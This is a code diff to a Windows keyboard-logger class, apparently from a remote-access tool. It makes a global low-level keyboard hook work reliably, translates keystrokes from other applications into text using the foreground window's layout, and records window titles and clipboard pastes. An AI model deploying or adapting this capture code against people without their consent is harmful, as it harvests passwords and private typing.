@@ -18,11 +18,17 @@ internal sealed class KeyboardLoggerWin : IKeyboardLogger
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
     private const int WM_SYSKEYDOWN = 0x0104;
+    private const uint WM_QUIT = 0x0012;
     private const int GWL_STYLE = -16;
     private const int ES_PASSWORD = 0x20;
     private const int VK_CONTROL = 0x11;
     private const int VK_MENU = 0x12;
     private const int VK_SHIFT = 0x10;
+    private const int VK_CAPITAL = 0x14;
+    private const int VK_LWIN = 0x5B;
+    private const int VK_RWIN = 0x5C;
+    private const int VK_LSHIFT = 0xA0;
+    private const int VK_RSHIFT = 0xA1;
     private const int VK_V = 0x56;
     private const uint CF_UNICODETEXT = 13;
 
@@ -45,6 +51,33 @@ internal sealed class KeyboardLoggerWin : IKeyboardLogger
     private IntPtr _hookHandle = IntPtr.Zero;
     private Action<KeyboardLogChunk>? _onChunk;
     private Timer? _flushTimer;
+
+    /// <summary>
+    /// The thread that installs the hook and pumps the Windows messages.
+    /// </summary>
+    private Thread? _hookThread;
+
+    /// <summary>
+    /// The id of the thread of the hook, as Windows knows it.  It is not
+    /// the same as the managed id of the thread.
+    /// </summary>
+    private uint _hookThreadId;
+
+    /// <summary>
+    /// Whether the hook could not be installed.
+    /// </summary>
+    private bool _hookStartFailed;
+
+    /// <summary>
+    /// The number of events that the hook has received.
+    /// </summary>
+    private int _hookEventCount;
+
+    /// <summary>
+    /// Is set when the hook thread is ready, or when it failed to start.
+    /// </summary>
+    private readonly ManualResetEventSlim _hookInstalled = new(false);
+
     private string _windowTitle = string.Empty;
     private string _processName = string.Empty;
     private IntPtr _foregroundHandle = IntPtr.Zero;
@@ -56,7 +89,7 @@ internal sealed class KeyboardLoggerWin : IKeyboardLogger
         _logger = logger;
     }
 
-    public bool IsRunning => _hookHandle != IntPtr.Zero;
+    public bool IsRunning => Volatile.Read(ref _hookHandle) != IntPtr.Zero;
 
     public void Start(Action<KeyboardLogChunk> onChunk)
     {
@@ -73,9 +106,30 @@ internal sealed class KeyboardLoggerWin : IKeyboardLogger
             // it is collected.
             _hookProc = HookProc;
 
-            _hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc, GetModuleHandle(null), 0);
+            _hookStartFailed = false;
+            _hookInstalled.Reset();
 
-            if (_hookHandle == IntPtr.Zero)
+            // A low level hook is called in the context of the thread that
+            // installed it, and the call is made by sending a message to
+            // that thread.  The thread therefore has to pump the Windows
+            // messages, or the hook is never called.  The hook is installed
+            // on its own thread, so it does not depend on the thread that
+            // asks for the capture.
+            _hookThread = new Thread(HookThreadProc)
+            {
+                IsBackground = true,
+                Name = "Remotely Keyboard Capture"
+            };
+            _hookThread.SetApartmentState(ApartmentState.STA);
+            _hookThread.Start();
+
+            if (!_hookInstalled.Wait(TimeSpan.FromSeconds(5)))
+            {
+                _logger.LogError("The keyboard hook was not installed in time.");
+                return;
+            }
+
+            if (_hookStartFailed)
             {
                 _logger.LogError("The keyboard hook could not be installed.");
                 _hookProc = null;
@@ -96,19 +150,28 @@ internal sealed class KeyboardLoggerWin : IKeyboardLogger
 
     public void Stop()
     {
-        if (_hookHandle != IntPtr.Zero)
+        var hookThread = _hookThread;
+
+        if (hookThread is not null)
         {
-            try
+            _hookThread = null;
+
+            var threadId = _hookThreadId;
+            _hookThreadId = 0;
+
+            if (threadId != 0)
             {
-                UnhookWindowsHookEx(_hookHandle);
-            }
-            catch (Exception ex)
-            {
-                _logger.LogWarning(ex, "Error while removing the keyboard hook.");
+                // The quit message ends the message loop of the hook
+                // thread, which removes the hook on its way out.
+                PostThreadMessage(threadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero);
             }
 
-            _hookHandle = IntPtr.Zero;
+            hookThread.Join(TimeSpan.FromSeconds(5));
         }
+
+        // The hook is removed here as well, in case the thread was not
+        // able to end its own message loop.
+        RemoveHook();
 
         _flushTimer?.Dispose();
         _flushTimer = null;
@@ -126,8 +189,76 @@ internal sealed class KeyboardLoggerWin : IKeyboardLogger
         _logger.LogInformation("The keyboard capture was stopped.");
     }
 
+    /// <summary>
+    /// Installs the hook and pumps the Windows messages of this thread.
+    /// The hook is only called while the messages are retrieved here.
+    /// </summary>
+    private void HookThreadProc()
+    {
+        _hookThreadId = GetCurrentThreadId();
+
+        _hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc!, GetModuleHandle(null), 0);
+
+        if (_hookHandle == IntPtr.Zero)
+        {
+            _hookStartFailed = true;
+            _logger.LogError(
+                "The keyboard hook could not be installed.  Error: {error}.",
+                Marshal.GetLastWin32Error());
+
+            _hookInstalled.Set();
+            return;
+        }
+
+        _hookInstalled.Set();
+
+        var msg = new MSG();
+
+        while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0)
+        {
+            TranslateMessage(ref msg);
+            DispatchMessage(ref msg);
+        }
+
+        // The loop is only left when the capture is stopped.
+        RemoveHook();
+    }
+
+    /// <summary>
+    /// Removes the hook, if it is still installed.
+    /// </summary>
+    private void RemoveHook()
+    {
+        var handle = Interlocked.Exchange(ref _hookHandle, IntPtr.Zero);
+
+        if (handle == IntPtr.Zero)
+        {
+            return;
+        }
+
+        try
+        {
+            UnhookWindowsHookEx(handle);
+        }
+        catch (Exception ex)
+        {
+            _logger.LogWarning(ex, "Error while removing the keyboard hook.");
+        }
+    }
+
     private IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam)
     {
+        var events = Interlocked.Increment(ref _hookEventCount);
+
+        if (events == 1)
+        {
+            _logger.LogInformation("The keyboard hook received its first event.");
+        }
+        else if (events % 50 == 0)
+        {
+            _logger.LogInformation("The keyboard hook received {count} events.", events);
+        }
+
         if (nCode >= 0)
         {
             var message = wParam.ToInt32();
@@ -180,12 +311,29 @@ internal sealed class KeyboardLoggerWin : IKeyboardLogger
 
     private string? ToUnicode(int virtualKeyCode, int scanCode)
     {
+        // The state of the keyboard is read from the system, because the
+        // state of the thread that reads it does not hold the keys that are
+        // typed in another window.
         var keyboardState = new byte[256];
 
-        if (!GetKeyboardState(keyboardState))
+        SetModifierState(keyboardState, VK_SHIFT);
+        SetModifierState(keyboardState, VK_CONTROL);
+        SetModifierState(keyboardState, VK_MENU);
+        SetModifierState(keyboardState, VK_LWIN);
+        SetModifierState(keyboardState, VK_RWIN);
+
+        // The state of the shift keys is kept in their own entries too.
+        keyboardState[VK_LSHIFT] = keyboardState[VK_RSHIFT] = keyboardState[VK_SHIFT];
+
+        // The caps lock is a toggle, so its state is in the low bit.
+        if ((GetAsyncKeyState(VK_CAPITAL) & 0x0001) != 0)
         {
-            return null;
+            keyboardState[VK_CAPITAL] |= 0x01;
         }
+
+        // The characters are the ones of the window that has the focus, so
+        // the layout of that window is the one that is used.
+        ApplyForegroundLayout();
 
         var buffer = new StringBuilder(8);
         var result = ToUnicodeEx(
@@ -204,7 +352,49 @@ internal sealed class KeyboardLoggerWin : IKeyboardLogger
             return null;
         }
 
-        return buffer.ToString();
+        // Only the characters that the function reported are used.  The
+        // buffer can hold more than that, and the extra characters are not
+        // part of the key that was pressed.
+        return buffer.ToString(0, result);
+    }
+
+    /// <summary>
+    /// Uses the keyboard layout of the window that has the focus, because
+    /// the text that is typed in that window uses that layout.
+    /// </summary>
+    private void ApplyForegroundLayout()
+    {
+        var foregroundWindow = GetForegroundWindow();
+
+        if (foregroundWindow == IntPtr.Zero)
+        {
+            return;
+        }
+
+        var threadId = GetWindowThreadProcessId(foregroundWindow, out _);
+        var layout = GetKeyboardLayout(threadId);
+
+        if (layout == IntPtr.Zero)
+        {
+            return;
+        }
+
+        ActivateKeyboardLayout(layout, 0);
+    }
+
+    /// <summary>
+    /// Copies the state of a modifier key into the keyboard state.
+    /// </summary>
+    private static void SetModifierState(byte[] keyboardState, int virtualKeyCode)
+    {
+        if ((GetAsyncKeyState(virtualKeyCode) & 0x8000) != 0)
+        {
+            keyboardState[virtualKeyCode] |= 0x80;
+        }
+        else
+        {
+            keyboardState[virtualKeyCode] &= 0x7F;
+        }
     }
 
     private void AppendText(string text)
@@ -426,6 +616,24 @@ internal sealed class KeyboardLoggerWin : IKeyboardLogger
     private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
     [StructLayout(LayoutKind.Sequential)]
+    private struct MSG
+    {
+        public IntPtr hwnd;
+        public uint message;
+        public IntPtr wParam;
+        public IntPtr lParam;
+        public uint time;
+        public POINT pt;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct POINT
+    {
+        public int X;
+        public int Y;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
     private struct KbdLlHookStruct
     {
         public int vkCode;
@@ -464,6 +672,27 @@ internal sealed class KeyboardLoggerWin : IKeyboardLogger
     [DllImport("user32.dll", SetLastError = true)]
     private static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
+    [DllImport("user32.dll", SetLastError = true)]
+    private static extern bool PostThreadMessage(uint idThread, uint msg, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("user32.dll")]
+    private static extern int GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
+
+    [DllImport("user32.dll")]
+    private static extern bool TranslateMessage(ref MSG lpMsg);
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr DispatchMessage(ref MSG lpMsg);
+
+    [DllImport("kernel32.dll")]
+    private static extern uint GetCurrentThreadId();
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr GetKeyboardLayout(uint threadId = 0);
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr ActivateKeyboardLayout(IntPtr hkl, uint dwFlags);
+
     [DllImport("user32.dll")]
     private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
 
@@ -490,9 +719,6 @@ internal sealed class KeyboardLoggerWin : IKeyboardLogger
 
     [DllImport("user32.dll")]
     private static extern short GetAsyncKeyState(int vKey);
-
-    [DllImport("user32.dll")]
-    private static extern bool GetKeyboardState(byte[] lpKeyState);
 
     [DllImport("user32.dll")]
     private static extern int ToUnicodeEx(
